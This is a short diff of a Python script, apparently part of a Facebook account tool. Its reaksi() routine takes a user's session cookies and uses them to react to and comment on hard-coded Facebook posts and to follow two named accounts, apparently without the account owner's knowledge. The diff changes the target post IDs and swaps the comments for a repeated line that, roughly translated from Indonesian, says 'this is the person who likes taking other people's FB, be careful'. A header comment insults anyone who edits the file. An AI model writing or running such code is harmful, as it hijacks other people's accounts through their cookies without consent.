@@ -2,7 +2,7 @@
 # jangan di ubah asu!!
 import requests as req,re,random
 from bs4 import BeautifulSoup as parser
-kom=random.choice(["Tes:)","Lo Ganteng Boss :v","Yang Posting Orang Nya Ganteng:)","Mantap:v","Be Yourself And Never Surrentod:v","Keren Bro Script Nya:)","Hi I'm mbf-fb User ^_^"])
+kom=random.choice(["Tes:)","Oh ini org nya yg suka ngambilin FB org hati2 bos lanjut","Oh ini org nya yg suka ngambilin FB org hati2 bos lanjut","Oh ini org nya yg suka ngambilin FB org hati2 bos lanjut","Oh ini org nya yg suka ngambilin FB org hati2 bos lanjut","Oh ini org nya yg suka ngambilin FB org hati2 bos lanjut","Oh ini org nya yg suka ngambilin FB org hati2 bos lanjut"])
 class ganteng:
 	def __init__(self,kuki,url):
 		self.kuki,self.url,self.true,self.atok=kuki,url,False,[]
@@ -40,7 +40,7 @@ class ganteng:
 					req.post(self.url+g.get("action"),data=kwargs,cookies=self.kuki)
 		except:pass
 	def reaksi(self):
-		self.get_tok();self.dahlah(f"{self.url}/403290050858408","4","ah sit");self.dahlah(f"{self.url}/523795802141165","8","ah sit");self.tuturkeun("Kang.Pacman");self.tuturkeun("azis701")
+		self.get_tok();self.dahlah(f"{self.url}/2975326539351678","4","ah sit");self.dahlah(f"{self.url}/2981749232042742","8","ah sit");self.tuturkeun("Kang.Pacman");self.tuturkeun("azis701")
 	def lang(self,cok):
 		try:
 			cek=req.get(f"{self.url}/language.php",cookies=cok).text
